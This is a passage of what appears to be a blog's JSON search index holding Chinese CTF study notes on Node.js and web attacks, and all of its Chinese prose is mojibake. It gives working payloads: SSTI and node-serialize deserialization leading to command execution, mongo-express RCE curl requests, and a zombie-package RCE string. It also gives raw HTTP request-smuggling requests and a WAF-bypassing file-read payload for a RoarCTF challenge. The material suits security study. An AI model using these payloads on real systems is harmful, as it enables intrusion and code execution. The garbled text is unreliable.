router = express.Router();var crypto = require(&#x27;crypto&#x27;);function md5(s) &#123; return crypto.createHash(&#x27;md5&#x27;) .update(s) .digest(&#x27;hex&#x27;);&#125;/* GET home page. */router.get(&#x27;/&#x27;, function(req, res, next) &#123; res.type(&#x27;html&#x27;); var flag=&#x27;xxxxxxx&#x27;; var a = req.query.a; var b = req.query.b; if(a &amp;&amp; b &amp;&amp; a.length===b.length &amp;&amp; a!==b &amp;&amp; md5(a+flag)===md5(b+flag))&#123; res.end(flag); &#125;else&#123; res.render(&#x27;index&#x27;,&#123; msg: &#x27;tql&#x27;&#125;); &#125; &#125;);module.exports = router; æ•°ç»„ç»•è¿‡å¯ä»¥è¯´é“çš„ç‚¹å¤ªå¤šäº†ï¼Œè¿™é‡Œå°±ç®€å•çš„è®²ä¸€ä¸ªå§ï¼Œè¦æ±‚è¾“å…¥çš„ä¸¤ä¸ªå€¼é•¿åº¦ä¸ç›¸ç­‰ä½†æ˜¯åŠ ä¸Šflagåçš„md5å€¼ç›¸ç­‰ã€‚ç›´æ¥åˆ©ç”¨æ•°ç»„ç»•è¿‡ï¼Œå› ä¸ºjsä¸­ä¸¤ä¸ªæ•°ç»„æ˜¯ä¸èƒ½ç›´æ¥ç”¨===åˆ¤æ–­ç›¸ç­‰çš„ï¼š 1?a[x]=1&amp;b[x]=2 åŸå‹é“¾æ±¡æŸ“æŒ–å‘ï¼Œæœ€è¿‘æ²¡ç©ºç ”ç©¶åŸå‹é“¾æ±¡æŸ“è¿™ä¸ªnodejsä¸­æ¯”è¾ƒå¤§çš„ä¸€å—ï¼Œå…ˆæ”¾ä¸¤ç¯‡æ–‡ç« ï¼Œä¹‹åå†å¡«ï¼šåŸºäºåŸå‹é“¾çš„ç»§æ‰¿æ·±å…¥ç†è§£ JavaScript Prototype æ±¡æŸ“æ”»å‡» sstiè¿™ä¸ªä¹‹å‰åœ¨å†™sstié‚£å—å°±è®²è¿‡äº†ï¼Œè¿™é‡Œå†è®°ä¸€ä¸‹å§ï¼Œæœ¬è´¨ä¸Šè¿˜æ˜¯å‘½ä»¤æ‰§è¡Œï¼Œä¸è¿‡ä¸æ˜¯åŸºäºeval()äº†ï¼š 1&#123;&#123;&#x27;&#x27;.constructor.constructor(&quot;return global.process.mainModule.constructor._load(&#x27;child_process&#x27;).execSync(&#x27;ls /&#x27;).toString()&quot;)()&#125;&#125; CVEæ¥ä¸‹æ¥æ€»ç»“ä¸€äº›æ¯”è¾ƒç»å…¸çš„å…³äºnodejsçš„CVEæ¼æ´ã€‚ nodejsååºåˆ—åŒ–æ¼æ´ï¼ˆCVE-2017-5941ï¼‰å‰ç½®çŸ¥è¯†ï¼šIIFEIIFEæ˜¯ä¸€ä¸ªåœ¨å®šä¹‰æ—¶å°±ä¼šç«‹å³æ‰§è¡Œçš„jså‡½æ•°ï¼Œä¸€èˆ¬å†™æˆå¦‚ä¸‹å½¢å¼ï¼š 12(function()&#123; /* code */ &#125;());(function()&#123; /* code */ &#125;)(); å‚è€ƒé“¾æ¥ï¼šIIFEï¼ˆç«‹å³è°ƒç”¨å‡½æ•°è¡¨è¾¾å¼ &#x6e;&#111;&#x64;&#x65;&#45;&#115;&#x65;&#x72;&#x69;&#x61;&#108;&#x69;&#122;&#101;&#64;&#48;&#46;&#48;&#46;&#52;ä¸­å­˜åœ¨ååºåˆ—åŒ–æ¼æ´ï¼š æˆ‘ä»¬å‘ç°è¢«æ¡†å‡ºçš„è¿™ä¸€è¯­å¥çš„evalå‚æ•°æ˜¯è¢«æ‹¬å·åŒ…è£¹ç€çš„ï¼Œå¦‚æœæˆ‘ä»¬æ„é€ ä¸€ä¸ªå½¢å¦‚function()&#123;&#125;()çš„å‡½æ•°ï¼Œåœ¨ååºåˆ—åŒ–æ—¶å°±ä¼šè¢«å½“ä¸­IIEFç«‹å³è°ƒç”¨æ‰§è¡Œã€‚ä¹Ÿå°±æ˜¯ä¸å¯ä¿¡è¾“å…¥ä¼ é€’åˆ°unserialize()çš„æ—¶å€™æ‰§è¡Œä»»æ„ä»£ç ã€‚ åˆ›å»ºpayloadæ—¶æœ€å¥½ä½¿ç”¨åŒä¸€æ¨¡å—çš„åºåˆ—åŒ–å‡½æ•°ï¼š 1234567serialize = require(&#x27;node-serialize&#x27;);var test = &#123; rce : function()&#123;require(&#x27;child_process&#x27;).exec(&#x27;ls /&#x27;,function(error, stdout, stderr)&#123;console.log(stdout)&#125;);&#125;,&#125;console.log(&quot;Payload: \\n&quot; + serialize.serialize(test));//&#123;&quot;rce&quot;:&quot;_$$ND_FUNC$$_function()&#123;require(&#x27;child_process&#x27;).exec(&#x27;ls /&#x27;,function(error, stdout, stderr)&#123;console.log(stdout)&#125;);&#125;&quot;&#125; ä¸ºäº†åœ¨ååºåˆ—åŒ–æ—¶è®©å…¶ç«‹å³è°ƒç”¨æˆ‘ä»¬æ„é€ çš„å‡½æ•°ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦åœ¨ç”Ÿæˆçš„åºåˆ—åŒ–è¯­å¥çš„å‡½æ•°åé¢å†æ·»åŠ ä¸€ä¸ª()ï¼Œæœ€ç»ˆpayloadå¦‚ä¸‹ï¼š 1&#123;&quot;rce&quot;:&quot;_$$ND_FUNC$$_function()&#123;require(&#x27;child_process&#x27;).exec(&#x27;ls /&#x27;,function(error, stdout, stderr)&#123;console.log(stdout)&#125;);&#125;()&quot;&#125; ä¼ é€’ç»™ååºåˆ—åŒ–æ‰§è¡Œå‘½ä»¤ï¼š 123var serialize = require(&#x27;node-serialize&#x27;);var payload = &#x27;&#123;&quot;rce&quot;:&quot;_$$ND_FUNC$$_function()&#123;require(\\&#x27;child_process\\&#x27;).exec(\\&#x27;ls /\\&#x27;,function(error, stdout, stderr)&#123;console.log(stdout)&#125;);&#125;()&quot;&#125;&#x27;;serialize.unserialize(payload); nodejsç›®å½•ç©¿è¶Šæ¼æ´ï¼ˆCVE-2017-14849ï¼‰å½±å“ç‰ˆæœ¬ï¼š Node.js 8.5.0 + Express 3.19.0-3.21.2 Node.js 8.5.0 + Express 4.11.0-4.15.5 æ¼æ´äº§ç”Ÿçš„åŸå› å°±æ˜¯nodejs8.5.0å¯¹ç›®å½•è¿›è¡Œnormalizeæ“ä½œæ—¶å‡ºç°äº†é€»è¾‘é”™è¯¯ï¼Œå¯¼è‡´è·¯å¾„å‘ä¸Šè·³è·ƒæ—¶åœ¨ä¸­é—´ä½ç½®æ·»åŠ ä¸€äº›å­—æ¯å°±å¯ä»¥æ—¶normalizeè¿”å›å¯¹åº”æ–‡ä»¶ã€‚ ä¾‹å¦‚ï¼Œâ€¦/â€¦/â€¦/foo/â€¦/â€¦/â€¦/â€¦/etc/passwdå¯ä»¥ä½¿normalizeè¿”å›/etc/passwdï¼Œä½†å®é™…ä¸Šæ­£ç¡®ç»“æœåº”è¯¥æ˜¯â€¦/â€¦/â€¦/â€¦/â€¦/â€¦/etc/passwdã€‚ è¿™ä¸ªæ¼æ´ä¸»è¦åº”ç”¨åœ¨ä¸€äº›é™æ€æ–‡ä»¶æœåŠ¡å™¨ä¸Šï¼Œæ¯”å¦‚ï¼Œexpressåœ¨åˆ¤æ–­pathæ˜¯å¦è¶…å‡ºé™æ€ç›®å½•èŒƒå›´æ—¶ï¼Œå°±ç”¨åˆ°äº†normalizeå‡½æ•°ï¼Œä¸Šè¿°BUGå¯¼è‡´normalizeå‡½æ•°è¿”å›é”™è¯¯ç»“æœå¯¼è‡´ç»•è¿‡äº†æ£€æŸ¥ï¼Œé€ æˆä»»æ„æ–‡ä»¶è¯»å–æ¼æ´ã€‚ mongo-express rceï¼ˆCVE-2019-10758ï¼‰å…³äºæ²™ç›’é€ƒé€¸è¿™å—å¯ä»¥è®²å¾—ä¸œè¥¿ä¹Ÿå¾ˆå¤šï¼Œè¿™é‡Œä¹Ÿæ²¡åŠæ³•å…·ä½“è®²è¿°ï¼Œæ€»ä¹‹æŠŠpayloadè´´åœ¨è¿™é‡Œï¼Œç„¶åæ”¾å‚è€ƒæ–‡ç« å°±å®Œäº‹äº†ã€‚ payload1ï¼š 1curl &#x27;http://localhost:8081/checkValid&#x27; -H &#x27;Authorization: Basic YWRtaW46cGFzcw==&#x27; --data &#x27;document=this.constructor.constructor(&quot;return process&quot;)().mainModule.require(&quot;child_process&quot;).execSync(&quot;/Applications/Calculator.app/Contents/MacOS/Calculator&quot;)&#x27; payload2: 12345node main.jsexploit = &quot;this.constructor.constructor(\\&quot;return process\\&quot;)().mainModule.require(&#x27;child_process&#x27;).execSync(&#x27;/Applications/Calculator.app/Contents/MacOS/Calculator&#x27;)&quot; var bson = require(&#x27;mongo-express/lib/bson&#x27;)bson.toBSON(exploit) å‚è€ƒæ–‡ç« ï¼šcve-2019-10758 mongo-express rce æ¼æ´åˆ†æ Nodejs Zoombie Package RCEhgameé‚£é¢˜markdownçš„ç¬¬äºŒéƒ¨åˆ†è€ƒçš„å°±æ˜¯è¿™ä¸ªpayloadï¼Œå½“æ—¶éƒ½æ²¡è§è¿‡nodejsç„¶åwebå°±å·®ä¸€é¢˜akã€‚åŒæ ·ä¹Ÿæ˜¯ç›´æ¥æ”¾payloadä¸å‚è€ƒé“¾æ¥ï¼Œè¿™ä¸ªå‚è€ƒé“¾æ¥æ­£æ˜¯å½“æ—¶hgame week4 markdown onlineçš„å‡ºé¢˜äººã€‚ payloadï¼š 1this.__proto__.constructor.constructor(&#x27;return process&#x27;)().mainModule.require(&#x27;child_process&#x27;).execSync(&#x27;calc&#x27;) å‚è€ƒæ–‡ç« ï¼šNodejs Zoombie Package RCE åˆ†æ æ€»ç»“ç®€å•æ€»ç»“äº†äº›node.jsçš„çŸ¥è¯†ç‚¹ï¼Œä¹Ÿç®—æ˜¯åˆæ­¥å…¥é—¨äº†å§ï¼Œä¹‹åé¢å¯¹ä¹‹å‰æ‘†çƒ‚æ²¡åšçš„nodejsçš„é¢˜ç›®ä¹Ÿå¯ä»¥å»ç¢°ä¸‹äº†ã€‚","categories":[{"name":"web","slug":"web","permalink":"http://example.com/categories/web/"}],"tags":[{"name":"-js -web","slug":"js-web","permalink":"http://example.com/tags/js-web/"}]},{"title":"httpè¯·æ±‚èµ°ç§","slug":"httpè¯·æ±‚èµ°ç§","date":"2022-05-08T02:25:32.000Z","updated":"2022-05-08T07:29:12.895Z","comments":true,"path":"2022/05/08/httpè¯·æ±‚èµ°ç§/","link":"","permalink":"http://example.com/2022/05/08/http%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/","excerpt":"å‰è¨€ æ‰“æ¯”èµ›ç¢°åˆ°äº†è¿™ä¸ªçŸ¥è¯†ç‚¹ï¼Œå°±é¡ºä¾¿å­¦ä¹ ä¸€ä¸‹ï¼Œhttpèµ°ç§è¿™å—å¦‚æœè¦è€ƒèµ·æ¥éš¾åº¦è¿˜æ˜¯æ¯”è¾ƒé«˜çš„ã€‚","text":"å‰è¨€ æ‰“æ¯”èµ›ç¢°åˆ°äº†è¿™ä¸ªçŸ¥è¯†ç‚¹ï¼Œå°±é¡ºä¾¿å­¦ä¹ ä¸€ä¸‹ï¼Œhttpèµ°ç§è¿™å—å¦‚æœè¦è€ƒèµ·æ¥éš¾åº¦è¿˜æ˜¯æ¯”è¾ƒé«˜çš„ã€‚ æ¼æ´æˆå› httpèµ°ç§ä¸å…¶ä»–webæ¼æ´å­˜åœ¨ç€æ¯”è¾ƒå¤§çš„ä¸åŒï¼Œå› ä¸ºä¸åŒæœåŠ¡å™¨å¯¹RFCæ ‡å‡†å®ç°çš„æ–¹å¼ä¸ç¨‹åº¦éƒ½ä¸å°½ç›¸åŒï¼Œè¿™å°±å¯¼è‡´äº†å¯¹åŒä¸€ä¸ªhttpè¯·æ±‚ä¸åŒæœåŠ¡å™¨å¯èƒ½ä¼šæœ‰ä¸åŒçš„å¤„ç†ç»“æœï¼Œå› æ­¤httpèµ°ç§çš„payloadå¹¶ä¸ç›¸é€šã€‚ æ¥ä¸‹æ¥æˆ‘ä»¬æ¥ä»‹ç»å¯¼è‡´httpèµ°ç§æ¼æ´çš„ä¸¤ä¸ªhttp1.1åè®®ç‰¹æ€§ï¼ŒKeep-Aliveå’ŒPipelineï¼š æ‰€è°“Keep-Aliveï¼Œå°±æ˜¯åœ¨HTTPè¯·æ±‚ä¸­å¢åŠ ä¸€ä¸ªç‰¹æ®Šçš„è¯·æ±‚å¤´Connection: Keep-Aliveï¼Œå‘Šè¯‰æœåŠ¡å™¨ï¼Œæ¥æ”¶å®Œè¿™æ¬¡HTTPè¯·æ±‚åï¼Œä¸è¦å…³é—­TCPé“¾æ¥ï¼Œåé¢å¯¹ç›¸åŒç›®æ ‡æœåŠ¡å™¨çš„HTTPè¯·æ±‚ï¼Œé‡ç”¨è¿™ä¸€ä¸ªTCPé“¾æ¥ï¼Œè¿™æ ·åªéœ€è¦è¿›è¡Œä¸€æ¬¡TCPæ¡æ‰‹çš„è¿‡ç¨‹ï¼Œå¯ä»¥å‡å°‘æœåŠ¡å™¨çš„å¼€é”€ï¼ŒèŠ‚çº¦èµ„æºï¼Œè¿˜èƒ½åŠ å¿«è®¿é—®é€Ÿåº¦ã€‚å½“ç„¶ï¼Œè¿™ä¸ªç‰¹æ€§åœ¨HTTP1.1ä¸­æ˜¯é»˜è®¤å¼€å¯çš„ã€‚ æœ‰äº†Keep-Aliveä¹‹åï¼Œåç»­å°±æœ‰äº†Pipelineï¼Œåœ¨è¿™é‡Œå‘¢ï¼Œå®¢æˆ·ç«¯å¯ä»¥åƒæµæ°´çº¿ä¸€æ ·å‘é€è‡ªå·±çš„HTTPè¯·æ±‚ï¼Œè€Œä¸éœ€è¦ç­‰å¾…æœåŠ¡å™¨çš„å“åº”ï¼ŒæœåŠ¡å™¨é‚£è¾¹æ¥æ”¶åˆ°è¯·æ±‚åï¼Œéœ€è¦éµå¾ªå…ˆå…¥å…ˆå‡ºæœºåˆ¶ï¼Œå°†è¯·æ±‚å’Œå“åº”ä¸¥æ ¼å¯¹åº”èµ·æ¥ï¼Œå†å°†å“åº”å‘é€ç»™å®¢æˆ·ç«¯ã€‚ ç®€å•æ¥è¯´å°±æ˜¯ï¼Œé•¿è¿æ¥å…è®¸å¤šä¸ªè¯·æ±‚å¤ç”¨åŒä¸€ä¸ªtcpè¿æ¥ï¼Œä¸å¿…æ¯ä¸ªè¯·æ±‚é‡æ–°å»ºç«‹è¿æ¥ï¼Œå¤§å¤§èŠ‚çº¦äº†æœåŠ¡å™¨èµ„æºï¼Œpiplineä½¿å¾—httpçš„è¯·æ±‚ä¸å¿…ç­‰åˆ°å“åº”ä¹‹ååœ¨å‘èµ·ï¼Œè€Œå¯ä»¥æµå¼å¾—å‘èµ·è¯·æ±‚ï¼Œè¯·æ±‚åˆ°è¾¾æœåŠ¡ç«¯åä»ç„¶é€šè¿‡æ’é˜Ÿçš„æ–¹å¼è¿›è¡Œå¤„ç†ã€‚ å½“æˆ‘ä»¬å‘ä»£ç†æœåŠ¡å™¨å‘é€ä¸€ä¸ªæ¯”è¾ƒæ¨¡ç³Šçš„HTTPè¯·æ±‚æ—¶ï¼Œç”±äºæœåŠ¡å™¨çš„å®ç°æ–¹å¼ä¸åŒï¼ˆå¤„ç†teä¸clæ—¶å­˜åœ¨å·®å¼‚ï¼‰ï¼Œå¯èƒ½ä»£ç†æœåŠ¡å™¨è®¤ä¸ºè¿™æ˜¯ä¸€ä¸ªHTTPè¯·æ±‚ï¼Œç„¶åå°†å…¶è½¬å‘ç»™äº†åç«¯çš„æºç«™æœåŠ¡å™¨ï¼Œä½†æºç«™æœåŠ¡å™¨ç»è¿‡è§£æå¤„ç†åï¼Œåªè®¤ä¸ºå…¶ä¸­çš„ä¸€éƒ¨åˆ†ä¸ºæ­£å¸¸è¯·æ±‚ï¼Œå‰©ä¸‹çš„é‚£ä¸€éƒ¨åˆ†ï¼Œå°±ç®—æ˜¯èµ°ç§çš„è¯·æ±‚ï¼Œå½“è¯¥éƒ¨åˆ†å¯¹æ­£å¸¸ç”¨æˆ·çš„è¯·æ±‚é€ æˆäº†å½±å“ä¹‹åï¼Œå°±å®ç°äº†HTTPèµ°ç§æ”»å‡»ã€‚ è¯·æ±‚æ–¹å¼cl!=0åœ¨RFC7231ä¸­æåˆ°ï¼Œå‡è®¾å‰ç«¯ä»£ç†æœåŠ¡å™¨å…è®¸GETè¯·æ±‚æºå¸¦è¯·æ±‚ä½“ï¼Œè€Œåç«¯æœåŠ¡å™¨ä¸å…è®¸GETè¯·æ±‚æºå¸¦è¯·æ±‚ä½“ï¼Œå®ƒä¼šç›´æ¥å¿½ç•¥æ‰GETè¯·æ±‚ä¸­çš„Content-Lengthå¤´ï¼Œä¸è¿›è¡Œå¤„ç†ã€‚ è¿™ç§æƒ…å†µä¸‹å°±æœ‰å¯èƒ½ä¼šå¯¼è‡´èµ°ç§ï¼Œæ¯”å¦‚æˆ‘ä»¬æ„é€ å¦‚ä¸‹çš„è¯·æ±‚ï¼š 1234567GET / HTTP/1.1\\r\\nHost: 127.0.0.1\\r\\nContent-Length: 44\\r\\nGET / secret HTTP/1.1\\r\\nHost: 127.0.0.1\\r\\n\\r\\n å‰ç«¯æœåŠ¡å™¨æ”¶åˆ°è¯·æ±‚åï¼Œè¯»å–Content-Lengthåˆ¤æ–­è¿™æ˜¯ä¸€ä¸ªå®Œæ•´è¯·æ±‚ï¼Œç„¶åè½¬å‘åˆ°åç«¯æœåŠ¡å™¨ï¼Œåç«¯æœåŠ¡å™¨ä¸å¤„ç†Content-Lengthï¼Œä½†åˆç”±äºPipelineå­˜åœ¨ï¼Œè¿™å°±æ„å‘³ç€åç«¯è®¤ä¸ºæ¥æ”¶åˆ°äº†ä¸¤ä¸ªè¯·æ±‚ï¼Œå¯¼è‡´äº†èµ°ç§çš„å‘ç”Ÿã€‚ cl-clRFC7230ä¸­è§„å®šï¼Œå½“æœåŠ¡å™¨æ”¶åˆ°çš„è¯·æ±‚ä¸­å«æœ‰ä¸¤ä¸ªContent-Lengthä¸”å€¼ä¸ç›¸ç­‰æ—¶åº”è¯¥è¿”å›400ã€‚ä½†æ˜¯æ€»æ˜¯æœ‰ä¸€äº›æœåŠ¡å™¨ä¼šå­˜åœ¨ä¸ä¸¥æ ¼æ‰§è¡Œæ ‡å‡†çš„æƒ…å†µï¼Œåœ¨è¿™æ ·çš„æƒ…å†µä¸‹æˆ‘ä»¬å°±å¯ä»¥å®‰æ’èµ°ç§äº†ã€‚ é¦–å…ˆæ„é€ ä¸€ä¸ªæ¶æ„è¯·æ±‚ï¼š 1234567POST / HTTP/1.1\\r\\nHost: 127.0.0.1\\r\\nContent-Length: 8\\r\\nContent-Length: 7\\r\\n12345\\r\\na åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œå‰ç«¯è¯»å–åˆ°äº†clæ˜¯8ï¼Œå› æ­¤æ•´ä¸ªåŒ…è¢«é€å…¥äº†åç«¯ï¼Œä½†æ˜¯åç«¯clåªè¯»å–äº†7ï¼Œå› æ­¤ç¼“å†²åŒºæ­¤æ—¶å‰©ä¸‹ä¸€ä¸ªå­—æ¯aã€‚é‚£ä¹ˆæ­¤æ—¶å¦‚æœä¸€ä¸ªæ­£å¸¸ç”¨æˆ·å¯¹æœåŠ¡å™¨å‘èµ·äº†è¯·æ±‚ï¼š 12GET /index.html HTTP/1.1\\r\\nHost: 127.0.0.1\\r\\n åŸæ¥å­˜åœ¨äºç¼“å†²åŒºçš„å­—æ¯aå°±è¢«æ‹¼æ¥äº†ï¼Œå®é™…è¯·æ±‚å‘ç”Ÿäº†æ”¹å˜ï¼š 12aGET /index.html HTTP/1.1\\r\\nHost: 127.0.0.1\\r\\n è¿™æ ·å°±å¯ä»¥æ’å…¥ä¸€äº›æ¶æ„è¯­å¥ï¼Œæ‹“å±•ä¸ºCSRFç­‰ç­‰ã€‚ cl-teç®€å•æ¥è¯´ï¼Œè¿™ç§èµ°ç§æ–¹å¼åˆ©ç”¨äº†å‰ç«¯æœåŠ¡å™¨åªå¤„ç†Content-Lengthï¼Œåç«¯åªå¤„ç†Transfer-Encodingè¿™ä¸€æƒ…å†µï¼Œè€Œå…³äºTransfer-Encodingè¿™ä¸€è¯·æ±‚å¤´å¯ä»¥å‚è€ƒä¸‹é¢è¿™ç¯‡æ–‡ç« ï¼šHTTP åè®®ä¸­çš„ Transfer-Encoding è¿™å…¶ä¸­æˆ‘ä»¬è¦åªè¦çš„æ˜¯chunkedç¼–ç çš„æ ¼å¼ï¼ˆsizeç”¨hexè¡¨ç¤ºï¼‰ï¼š 1[chunk size][\\r\\n][chunk data][\\r\\n][chunk size][\\r\\n][chunk data][\\r\\n][chunk size = 0][\\r\\n][\\r\\n] æ¥ä¸‹æ¥æˆ‘ä»¬å¯ä»¥æ„é€ å¦‚ä¸‹è¯·æ±‚ï¼š 12345678910111213POST / HTTP/1.1\\r\\nHost: 127.0.0.1\\r\\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:56.0) Gecko/20100101 Firefox/56.0\\r\\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\\r\\nAccept-Language: en-US,en;q=0.5\\r\\nCookie: session=E9m1pnYfbvtMyEnTYSe5eijPDC04EVm3\\r\\nConnection: keep-alive\\r\\nContent-Length: 6\\r\\nTransfer-Encoding: chunked\\r\\n\\r\\n0\\r\\n\\r\\nG è¿™æ ·ï¼Œç”±äºå‰ç«¯æœåŠ¡å™¨è§£æäº†Content-Lengthï¼Œå› æ­¤ 1230\\r\\n\\r\\nG è¢«å…¨éƒ¨è§£æï¼Œæ¥ä¸‹æ¥ä¼ è¾“åˆ°åç«¯ååç«¯æœåŠ¡å™¨è§£æTransfer-Encodingï¼Œé‚£ä¹ˆè¯†åˆ«åˆ°Gä¹‹å‰å°±è¢«è®¤ä¸ºå·²ç»ç»“æŸäº†ï¼Œå› æ­¤Gè¢«ç•™åœ¨äº†ç¼“å†²åŒºï¼Œé‚£ä¹ˆå°±ä¼šå¯¼è‡´ä¸‹ä¸€æ¬¡è¯·æ±‚Gè¢«è§£æå‡ºæ¥æ‹¼æ¥åˆ°è¯·æ±‚ä¹‹å‰ï¼Œå¯¼è‡´æŠ¥é”™ã€‚ te-clçœ‹åå­—åº”è¯¥ä¹Ÿèƒ½ç†è§£ï¼Œå°±æ˜¯å’Œcl-teç›¸åï¼Œå‰ç«¯æœåŠ¡å™¨è§£æTransfer-Encodingï¼Œè€Œåç«¯æœåŠ¡å™¨è§£æContent-Lengthã€‚é‚£ä¹ˆæˆ‘ä»¬æ„å»ºè¿™æ ·ä¸€ä¸ªè¯·æ±‚ï¼š 1234567891011121314POST / HTTP/1.1\\r\\nHost: 127.0.0.1\\r\\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:56.0) Gecko/20100101 Firefox/56.0\\r\\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\\r\\nAccept-Language: en-US,en;q=0.5\\r\\nCookie: session=3Eyiu83ZSygjzgAfyGPn8VdGbKw5ifew\\r\\nContent-Length: 4\\r\\nTransfer-Encoding: chunked\\r\\n\\r\\n21\\r\\nPOST /mrl64.html HTTP/1.1\\r\\n\\r\\n0\\r\\n\\r\\n æˆ‘ä»¬å‘ç°é¦–å…ˆå‰ç«¯æœåŠ¡å™¨å¤„ç†Transfer-Encodingï¼Œé‚£ä¹ˆç›´åˆ°è¯»å–åˆ°0\\r\\n\\r\\nç»“æŸï¼Œå› æ­¤æ•´ä¸ªè¯·æ±‚éƒ½æ˜¯å®Œæ•´çš„ï¼Œè¿™æ ·æ•´ä¸ªè¯·æ±‚å°±è¢«é€åˆ°äº†åæ–¹æœåŠ¡å™¨ã€‚æ¥ä¸‹æ¥åç«¯æœåŠ¡å™¨è§£æContent-Lengthï¼Œé‚£ä¹ˆè¯»å–å®Œ21\\r\\nåå°±ç»“æŸäº†ï¼Œåé¢çš„å†…å®¹å°±è¢«å½“åšäº†å¦ä¸€ä¸ªè¯·æ±‚ç»§ç»­æ‰§è¡Œã€‚ te-teé‚£ä¹ˆæ’åˆ—ç»„åˆä¸€ä¸‹å‰©ä¸‹çš„æœ€åä¸€ç§æƒ…å†µå°±æ˜¯te-teäº†ï¼Œå‰åç«¯æœåŠ¡å™¨éƒ½ä¼šè§£æå¤„ç†Transfer-Encodingã€‚ä¸è¿‡æœ‰æ‰€åŒºåˆ«çš„æ˜¯ï¼Œç”±äºå‰åç«¯æœåŠ¡å™¨æ¯•ç«Ÿä¸æ˜¯åŒä¸€ç§ï¼Œæˆ‘ä»¬æ— æ³•ç›´æ¥æ„é€ è¯·æ±‚ã€‚è¿™é‡Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨Content-LengthåŠ ä»¥æ··æ·†ä»è€Œä½¿æœåŠ¡å™¨ä¸å¤„ç†æŸä¸ªTransfer-Encodingã€‚è¿™æ ·å°±ç›¸å½“äºæŠŠé—®é¢˜åˆå˜æˆäº†te-clæˆ–è€…cl-teã€‚ é‚£ä¹ˆæˆ‘ä»¬æ„é€ è¯·æ±‚ï¼š 123456789101112131415161718POST / HTTP/1.1\\r\\nHost: 127.0.0.1\\r\\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:56.0) Gecko/20100101 Firefox/56.0\\r\\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\\r\\nAccept-Language: en-US,en;q=0.5\\r\\nCookie: session=Mew4QW7BRxkhk0p1Thny2GiXiZwZdMd8\\r\\nContent-length: 4\\r\\nTransfer-Encoding: chunked\\r\\nTransfer-Encoding: cow\\r\\n\\r\\n5c\\r\\nGPOST / HTTP/1.1\\r\\nContent-Type: application/x-www-form-urlencoded\\r\\nContent-Length: 15\\r\\n\\r\\nx=1\\r\\n0\\r\\n\\r\\n è¿™é‡Œåç«¯æœåŠ¡å™¨å°±ä¸ä¼šè§£æTransfer-Encodingäº†ï¼Œè€Œæ˜¯è§£æå¤„ç†Content-lengthï¼Œè¾¾åˆ°äº†te-clçš„èµ°ç§æ•ˆæœã€‚ [RoarCTF 2019]Easy Calcè¿™é“é¢˜æˆ‘ä»¬ä¹‹å‰æ˜¯åˆ©ç”¨phpå­—ç¬¦ä¸²è§£ææ¼æ´è§£å†³çš„ï¼Œé‚£ä¹ˆç°åœ¨æˆ‘ä»¬åˆ©ç”¨httpèµ°ç§çš„æ–¹æ³•ã€‚ é¦–å…ˆæ”¾ä¸‹ä»£ç calc.phpï¼š 123456789101112131415 &lt;?phperror_reporting(0);if(!isset($_GET[&#x27;num&#x27;]))&#123; show_source(__FILE__);&#125;else&#123; $str = $_GET[&#x27;num&#x27;]; $blacklist = [&#x27; &#x27;, &#x27;\\t&#x27;, &#x27;\\r&#x27;, &#x27;\\n&#x27;,&#x27;\\&#x27;&#x27;, &#x27;&quot;&#x27;, &#x27;`&#x27;, &#x27;\\[&#x27;, &#x27;\\]&#x27;,&#x27;\\$&#x27;,&#x27;\\\\&#x27;,&#x27;\\^&#x27;]; foreach ($blacklist as $blackitem) &#123; if (preg_match(&#x27;/&#x27; . $blackitem . &#x27;/m&#x27;, $str)) &#123; die(&quot;what are you want to do?&quot;); &#125; &#125; eval(&#x27;echo &#x27;.$str.&#x27;;&#x27;);&#125;?&gt; å…¶å®å­—æ¯éƒ½æ˜¯ä¸å…è®¸è¾“å…¥çš„ï¼Œä¼šè¿”å›403ï¼Œä¸è¿‡æˆ‘ä»¬å¯ä»¥åˆ©ç”¨cl-clçš„httpè¯·æ±‚èµ°ç§æ¥ç»•è¿‡wafã€‚ æ„é€ å¦‚ä¸‹è¯·æ±‚ï¼š 123456789101112GET /calc.php?num=phpinfo(); HTTP/1.1Host: node4.buuoj.cn:25903User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:91.0) Gecko/20100101 Firefox/91.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateConnection: closeCookie: track_uuid=9500a345-a839-4645-aee4-f9c598b48bf2; __gads=ID=f01d1993f76853c0-224634b7f6d100ca:T=1649937963:RT=1649937963:S=ALNI_MZ-hofC8jAB4S9yUeyX8RMp1LN2-gUpgrade-Insecure-Requests: 1Cache-Control: max-age=0Content-Length: 0Content-Length: 0 ç”±äºå‰åç«¯æœåŠ¡å™¨åˆ†åˆ«è§£æäº†Content-Lengthï¼Œå¯¼è‡´æœåŠ¡å™¨ä»¥ä¸ºæˆ‘ä»¬æ²¡æœ‰è¾“å…¥å†…å®¹ï¼Œè¿”å›äº†400ï¼Œä½†æ˜¯phpinfoä¾ç„¶æˆåŠŸæ˜¾ç¤ºã€‚å› æ­¤è¿™æ ·æˆ‘ä»¬åªéœ€è¦ç»•è¿‡æ˜é¢çš„blacklistå°±å¯ä»¥äº†ï¼Œæœ€ç»ˆpayloadï¼š 123456789101112GET /calc.php?num=var_dump(readfile(chr(47).base_convert(25254448,10,36))); HTTP/1.1Host: node4.buuoj.cn:25903User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:91.0) Gecko/20100101 Firefox/91.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateConnection: closeCookie: track_uuid=9500a345-a839-4645-aee4-f9c598b48bf2; 